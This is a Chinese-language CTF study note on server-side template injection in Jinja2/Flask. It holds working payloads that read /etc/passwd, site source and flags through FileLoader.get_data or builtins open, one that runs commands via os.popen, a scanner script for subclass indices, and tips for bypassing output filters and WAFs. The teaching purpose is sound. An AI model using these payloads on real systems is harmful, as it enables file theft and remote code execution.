---
title: SSTI 文件读取
category: SSTI/利用
tags: [SSTI, FileLoader, get_data, builtins, open, 无回显, 输出过滤]
source: 课程笔记 20251011
order: 3
---

## 一句话概括

SSTI 打到文件读取，主流有两条路：一是找 `_frozen_importlib_external.FileLoader` 这类**自带文件读取方法的子类**，直接 `['get_data'](0, 路径)`；二是借 `__builtins__` 里的 **`open()`**。文件内容一旦被回显到页面，flag 到手。

## 原理

### 1. 为什么能读文件

接《SSTI基础利用与继承链》：只要爬到某个类的 `__init__.__globals__`，就能拿到该模块的全局命名空间。标准库里有不少**已经 import 过文件相关能力**的模块，于是读文件比执行命令更「轻量」—— 不需要 `os`，也不需要 `subprocess`。

原笔记的思路很直接：**「由于通过查找子集（`__subclasses__()`）的方法过于繁琐，所以用脚本自动扫」**。

### 2. 路径一：FileLoader 的 `get_data`

`_frozen_importlib_external.FileLoader` 是 Python 导入系统里的类，它带一个 `get_data` 方法，本身就能读文件：

```python
name={{''.__class__.__subclasses__()[79]["get_data"](0, "/etc/passwd")}}
```

| 片段 | 含义 |
|---|---|
| `[79]` | FileLoader 在 `__subclasses__()` 里的索引（**因环境而异，必须自己扫**） |
| `["get_data"]` | 访问该类的 `get_data` 方法 |
| `(0, "/etc/passwd")` | 第一个参数 `0` 是标志位，第二个参数是要读取的文件路径 |

> 原笔记对 `(0, ...)` 的注释：`0` 可能是某种标志或路径参数，`"/etc/passwd"` 是目标文件路径。`get_data` 的签名就是 `get_data(path)` 在加载器语义下带一个 `path`/标志参数，此处照抄原 payload 即可。

### 3. 路径二：`__builtins__` 里的 `open`

更常见的是从 `__builtins__`（内置函数字典）里直接取 `open`：

```python
{{ ''.__class__.__base__.__subclasses__()[98].__init__.__globals__['__builtins__']['open']('/etc/passwd').read() }}
```

链条和命令执行完全一样，只是最后掏出来的是 `open` 而不是 `popen`：

```text
对象 → __class__ → __base__ → __subclasses__()[i] → __init__
→ __globals__['__builtins__'] → ['open']('/etc/passwd').read()
```

`__builtins__` 是每个模块命名空间里都存在的内置函数字典，所以**命中的 i 比找 os 宽松得多**，很多子类都能用。

## 利用条件

1. 已确认存在 SSTI，且能访问 `__class__` / `__subclasses__` / `__globals__`
2. 目标子类的索引可用（需先探测）
3. 读到的内容能回显（无回显时见下文「只给用不给看」）
4. Web 用户对目标文件有读权限（如 `/etc/passwd`、网站源码、`/flag`）

## Payload 速查

| 目的 | Payload |
|---|---|
| FileLoader 读文件 | `...__subclasses__()[i]['get_data'](0, '/etc/passwd')` |
| builtins.open 读文件 | `...__globals__['__builtins__']['open']('/etc/passwd').read()` |
| 读网站源码 | 把路径换成 `/var/www/html/app.py` 等 |
| 读 flag | 把路径换成 `/flag` 或题目指定位置 |

## 完整示例：扫描 FileLoader 的索引

原笔记给了多版脚本，早期版本因语法问题跑不通（见「踩坑」），下面这版是修正后的可用形态——**用 GET 把 payload 放进 `name` 参数**：

```python
import requests

url = "http://靶机地址/"
# 遍历前 500 个 object 子类，找出 FileLoader 所在索引
payload_tpl = "{{ ''.__class__.__base__.__subclasses__()[{i}] }}"

for i in range(500):
    try:
        r = requests.get(url, params={"name": payload_tpl.format(i=i)}, timeout=5)
        if r.status_code == 200:
            if '_frozen_importlib_external.FileLoader' in r.text:
                print(f"[+] 找到 FileLoader - 索引: {i}")
            if 'catch_warnings' in r.text:
                print(f"[+] 找到 warnings.catch_warnings - 索引: {i}")
            if 'os' in r.text.lower() or 'subprocess' in r.text.lower():
                print(f"[+] 系统相关类 - 索引: {i}")
    except Exception as e:
        print(f"索引 {i} 请求失败: {e}")
```

拿到索引后，直接调用 `get_data` 读文件：

```text
name={{''.__class__.__subclasses__()[79]["get_data"](0, "/etc/passwd")}}
```

> 原笔记还记录了一版等价的读文件 payload：`{{ ''.__class__.__subclasses__()[98].__init__.__globals__['__builtins__']['open']('/etc/passwd').read() }}`，实测可用。更通用的写法是在 `__class__` 后补一个 `.__base__`（先上溯到 object 再取子类），索引会更容易对齐到别人的经验值。

## 只给用，不给看：输出被过滤时怎么办

原笔记遇到一个很迷惑的现象：**类对象能取到，但页面什么都不显示**。

### 探测过程

原笔记先用两种思路探测：

```text
# 方案1：故意越界，看有没有报错回显
{{ ''.__class__.__subclasses__()[9999] }}

# 方案2：用 or 制造一个"兜底输出"
{{ ''.__class__.__subclasses__()[98] or "SUCCESS" }}
```

实测结果：

| 输入 | 回显 |
|---|---|
| `{{ ''.__class__.__subclasses__()[98] }}` | **无回显** |
| `{{ ''.__class__.__subclasses__()[98] or "SUCCESS" }}` | 返回 `SUCCESS` |
| `{{ ...['__builtins__']['open']('/etc/passwd').read() }}` | **正常工作** |

### 结论：过滤的是「输出内容」，不是「执行过程」

原笔记的推断（保留原意）：

> 直接输出类对象时被过滤/拦截，但通过方法调用链访问时不过滤 —— 说明过滤规则是基于**输出内容**而非执行过程。简单来说就是**只给用，不给看**。

等价于应用层做了这样一件事：

```python
if 输出内容包含 "__class__" 或 "<class" 等关键词:
    返回空字符串   # 拦截显示
else:
    正常输出       # 放行
```

所以：

- `{{ ''.__class__.__subclasses__()[98] }}` 的**输出**是 `<class '_frozen_importlib_external.FileLoader'>` —— 含 `<class`，被清空
- `...['open']('/etc/passwd').read()` 的**输出**是文件正文 —— 不含敏感关键词，正常放行

**这给了一条重要经验：只要最终输出不是"看起来像类对象"的字符串，payload 就能穿过这种基于输出的过滤。**

命令执行同理，下面的 payload 最终输出是 `uid=0(root) ...`，同样能过关：

```python
{{ ''.__class__.__subclasses__()[98].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

> 原笔记用的是本机靶场地址，本文统一写作 `靶机地址`。

### 读取配置里的 FLAG

当 flag 放在 Flask 的配置对象里时，可以完全不碰 `__subclasses__`，直接用 Flask 模板自带的函数：

```python
{{ url_for.__globals__['current_app'].config.FLAG }}
```

```python
{{ get_flashed_messages.__globals__['current_app'].config.FLAG }}
```

（`config` 的完整玩法见《SSTI获取config与os函数调用》。）

## 踩坑与备注

- **索引一定要自己扫**：`[79]`、`[98]` 都是特定环境下的数字，换台机器就变。原笔记早期脚本之所以「无法使用」，一半是索引没对齐，一半是语法问题。
- **原脚本的语法坑**：早期版本写成 `data = {"name": "{(().__class__.__base__.__subclasses__()[" + str(i) + "]}"}`，除了 `{(` 这种不是合法 Jinja2 表达式的笔误，更关键的是**循环外的请求只发了最后一个 `i`**（缩进错误）。原笔记后来「修改为 get 方式请求」才跑通 —— 这说明**扫描脚本本身必须放在循环体内**，且用 GET 把 payload 放进 `params` 更稳。
- **原文里 `''.__class__.__subclasses__()[98]` 少了一层 `.__base__`**：`''.__class__` 是 `str`，直接 `str.__subclasses__()` 得到的并不是 object 的子类列表，索引极易越界。若该写法报错，补上 `.__base__` 即可（这也是本文「完整示例」里脚本采用的写法）。
- **`''.class.subclasses()` 这种「去掉下划线仍能成功」的记录存疑**：正常 Python 里属性名必须带下划线，原笔记里这一版很可能是 Markdown 渲染时把 `__` 吞掉了。它的结论（过滤只针对输出内容）与上文一致，但写法本身不要照抄。
- **过滤可能只针对特定关键词**：原笔记猜测「可能是过滤了 `subclasses`，因为使用 `mro` 可以使用」—— 换用 `__mro__[1]` 代替 `__base__`、或换起点对象，往往能绕过去。
- **`catch_warnings` 是另一个万能跳板**：`warnings.catch_warnings` 的 `__init__.__globals__` 里同样有完整的内置函数环境，很多环境里它比 FileLoader 更常被扫到。
- **读文件优先于执行命令**：能用 `open().read()` 就别急着弹 shell，既不容易触发 WAF，也不会因为命令回显缺失而白忙一场。
